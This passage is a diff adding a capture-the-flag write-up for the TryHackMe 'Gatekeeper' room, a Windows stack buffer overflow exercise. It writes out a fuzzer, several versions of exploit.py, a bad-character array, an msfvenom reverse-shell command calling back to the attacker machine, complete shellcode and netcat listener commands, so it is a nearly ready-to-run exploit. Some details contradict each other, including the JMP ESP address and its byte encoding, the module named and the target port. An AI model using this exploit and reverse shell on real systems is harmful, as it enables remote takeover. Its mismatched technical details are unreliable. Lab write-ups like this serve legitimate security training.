@@ -1,0 +1,358 @@
+# Gatekeeper
+
+**Room Link:** [https://tryhackme.com/room/gatekeeper](https://tryhackme.com/room/gatekeeper)
+
+
+
+## Scanning
+
+```
+nmap -A $VICTIM
+```
+
+<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
+
+### **RPC/**TCP port 135
+
+```
+rpcclient -U '' $VICTIM
+```
+
+<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+
+### **NetBIOS/**TCP port 139
+
+```
+nbtscan $VICTIM
+```
+
+<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+
+### **SMB/**TCP port 445
+
+I was able to download the file gatekeeper.exe file
+
+```
+smbclient -L //$VICTIM/
+smbget -R smb://$VICTIM/Users
+smbclient  \\\\$VICTIM\\Users
+smb: \> cd Share
+smb: \Share\> get gatekeeper.exe 
+```
+
+<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+## Test Machine
+
+```
+xfreerdp /u:admin /p:password /cert:ignore /v:$TESTMACHINE /workarea  +clipboard
+python2 -m SimpleHTTPServer 81
+```
+
+![](<../../.gitbook/assets/image (6).png>)
+
+### **Crash Replication & Controlling EIP**
+
+
+
+I crashed the program by sending 1000 As
+
+```
+python -c 'print("A"* 1000)'
+nc -v $TESTMACHINE 31337
+```
+
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+**fuzzer.py**
+
+```
+#!/usr/bin/env python3
+
+import socket, time, sys
+
+try:
+	ip = str(sys.argv[1])
+	port = int(sys.argv[2])
+	print (ip+":"+str(port))
+	timeout = 5
+	prefix = ""
+	string = prefix + "A" * 10
+
+	while True:
+		try:
+			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+				s.settimeout(timeout)
+				s.connect((ip, port))
+				
+				print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
+				s.send(bytes(string, "latin-1"))
+				s.send(bytes("\n", "latin-1"))
+
+
+		except:
+			print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
+			sys.exit(0)
+		string += 10 * "A"
+		time.sleep(1)
+
+except:
+    print ("\nCould not connect!")
+    sys.exit()
+
+```
+
+The fuzzer didn't work as well as it did with other BOF problems. It kept sending bytes even after the program crashed so I had to manually watch when it crashed, which happened around a payload size of 150 bytes.
+
+```
+python fuzzer.py $VICTIM 1337
+```
+
+<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+**exploit.py**
+
+```
+import socket, time, sys
+
+try:
+	ip = str(sys.argv[1])
+	port = int(sys.argv[2])
+	print (ip+":"+str(port))
+
+	prefix = ""
+	offset = 146
+	overflow = "A" * offset
+	retn = "BBBB"
+	padding = ""
+	payload = ""
+	postfix = ""
+
+	buffer = prefix + overflow + retn + padding + payload + postfix
+
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+	try:
+		s.connect((ip, port))
+		print("Sending evil buffer...")
+		s.send(bytes(buffer + "\r\n", "latin-1"))
+		print("Done!")
+	except:
+ 		print("Could not connect.")
+except:
+    print ("\nCould not connect!")
+    sys.exit()
+```
+
+To control EIP I had to do a few attempts but eventually found out a offset of 146 is what I needed.
+
+```
+python exploit.py $VICTIM 1337
+```
+
+
+
+<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+### Finding Bad Characters
+
+**Kali**
+
+Now we changed the program to look for bad characters so we don't later use those bad characters when generating our payload. We do this by setting our payload to all possible characters, than follow EIP to see which characters aren't showing up. To do this we just have to keep running our exploit and removing the bad characters one by one. The bad characters found were: \x00\x0a
+
+#### **exploit.py - Code Changes #1**
+
+```
+import socket, time, sys
+
+#Bad chars found: \x00\x0a
+badChars = (
+"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f"
+"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
+"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
+"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
+"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
+"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
+"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
+"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
+"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
+"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
+"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
+"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
+"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
+"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
+"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
+"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+)
+
+try:
+	ip = str(sys.argv[1])
+	port = int(sys.argv[2])
+	print (ip+":"+str(port))
+
+	prefix = ""
+	offset = 146
+	overflow = "A" * offset
+	retn = "BBBB"
+	padding = ""
+	payload = badChars
+	postfix = ""
+
+	buffer = prefix + overflow + retn + padding + payload + postfix
+
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+	try:
+		s.connect((ip, port))
+		print("Sending evil buffer...")
+		s.send(bytes(buffer + "\r\n", "latin-1"))
+		print("Done!")
+	except:
+ 		print("Could not connect.")
+except:
+    print ("\nCould not connect!")
+    sys.exit()
+```
+
+
+
+
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+### Finding a Jump Point
+
+Now we need to find a place to jump to to run our payload.  We find there is only one place that will meets our conditions that we need which is an address with  SafeSEH, ASLR, and NXCompat disabled and the memory address doesn't start with 0x00. ex: 0x0040000 won't work, 0x100000 will work. 0x08040000 is the only possible address to use but  SafeSEH is not disabled.
+
+essfunc.dll meets this criteria.&#x20;
+
+**Immunity Debugger**
+
+```
+!mona modules
+```
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+We find that essfunc.dll has 2 possible JMP ESPs to use. So we will start with the first one which is 0x080414c3 but when we add it to our code we need it in little endian format so it becomes \xaf\x11\x50\x62.
+
+**Immunity Debugger**
+
+```
+!mona find -s "\xff\xe4" -m gatekeeper.exe
+```
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+### Exploit - Staging
+
+Now that we have the return address to use, we just need to generate our payload without using the bad characters found previously. I also added 16 NOPs before the payload as suggested in the room. All that is left is to is to update our code with our payload and run it against the program.
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f c
+```
+
+#### **exploit.py - Code Changes #2**
+
+```
+import socket, time, sys
+
+try:
+	ip = str(sys.argv[1])
+	port = int(sys.argv[2])
+	print (ip+":"+str(port))
+
+	prefix = ""
+	offset = 146
+	overflow = "A" * offset
+	retn = "\xc3\x14\x04\x08"
+	padding = "\x90" * 16
+	payload = ( "\xbf\x99\x11\x01\x8f\xdd\xc6\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
+"\x52\x31\x7e\x12\x83\xc6\x04\x03\xe7\x1f\xe3\x7a\xeb\xc8\x61"
+"\x84\x13\x09\x06\x0c\xf6\x38\x06\x6a\x73\x6a\xb6\xf8\xd1\x87"
+"\x3d\xac\xc1\x1c\x33\x79\xe6\x95\xfe\x5f\xc9\x26\x52\xa3\x48"
+"\xa5\xa9\xf0\xaa\x94\x61\x05\xab\xd1\x9c\xe4\xf9\x8a\xeb\x5b"
+"\xed\xbf\xa6\x67\x86\x8c\x27\xe0\x7b\x44\x49\xc1\x2a\xde\x10"
+"\xc1\xcd\x33\x29\x48\xd5\x50\x14\x02\x6e\xa2\xe2\x95\xa6\xfa"
+"\x0b\x39\x87\x32\xfe\x43\xc0\xf5\xe1\x31\x38\x06\x9f\x41\xff"
+"\x74\x7b\xc7\x1b\xde\x08\x7f\xc7\xde\xdd\xe6\x8c\xed\xaa\x6d"
+"\xca\xf1\x2d\xa1\x61\x0d\xa5\x44\xa5\x87\xfd\x62\x61\xc3\xa6"
+"\x0b\x30\xa9\x09\x33\x22\x12\xf5\x91\x29\xbf\xe2\xab\x70\xa8"
+"\xc7\x81\x8a\x28\x40\x91\xf9\x1a\xcf\x09\x95\x16\x98\x97\x62"
+"\x58\xb3\x60\xfc\xa7\x3c\x91\xd5\x63\x68\xc1\x4d\x45\x11\x8a"
+"\x8d\x6a\xc4\x1d\xdd\xc4\xb7\xdd\x8d\xa4\x67\xb6\xc7\x2a\x57"
+"\xa6\xe8\xe0\xf0\x4d\x13\x63\xf5\x9b\x2e\xaa\x61\x9e\x50\x5d"
+"\x2e\x17\xb6\x37\xde\x71\x61\xa0\x47\xd8\xf9\x51\x87\xf6\x84"
+"\x52\x03\xf5\x79\x1c\xe4\x70\x69\xc9\x04\xcf\xd3\x5c\x1a\xe5"
+"\x7b\x02\x89\x62\x7b\x4d\xb2\x3c\x2c\x1a\x04\x35\xb8\xb6\x3f"
+"\xef\xde\x4a\xd9\xc8\x5a\x91\x1a\xd6\x63\x54\x26\xfc\x73\xa0"
+"\xa7\xb8\x27\x7c\xfe\x16\x91\x3a\xa8\xd8\x4b\x95\x07\xb3\x1b"
+"\x60\x64\x04\x5d\x6d\xa1\xf2\x81\xdc\x1c\x43\xbe\xd1\xc8\x43"
+"\xc7\x0f\x69\xab\x12\x94\x89\x4e\xb6\xe1\x21\xd7\x53\x48\x2c"
+"\xe8\x8e\x8f\x49\x6b\x3a\x70\xae\x73\x4f\x75\xea\x33\xbc\x07"
+"\x63\xd6\xc2\xb4\x84\xf3"
+		)
+	postfix = ""
+
+	buffer = prefix + overflow + retn + padding + payload + postfix
+
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+	try:
+		s.connect((ip, port))
+		print("Sending evil buffer...")
+		s.send(bytes(buffer + "\r\n", "latin-1"))
+		print("Done!")
+	except:
+ 		print("Could not connect.")
+except:
+    print ("\nCould not connect!")
+    sys.exit()
+```
+
+**Kali #1**
+
+```
+nc -lvnp 4444
+```
+
+**Kali #2**
+
+```
+python exploit.py $TESTMACHINE 31337
+```
+
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+### Exploit - Production
+
+The program worked against our staging environment so it should work against the actual box we're trying to exploit. It ends up working with exploit.py.
+
+**Kali #1**
+
+```
+rlwrap nc -lvnp 4444
+```
+
+**Kali #2**
+
+```
+python exploit.py $VICTIM 31337
+```
+
+
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+
+
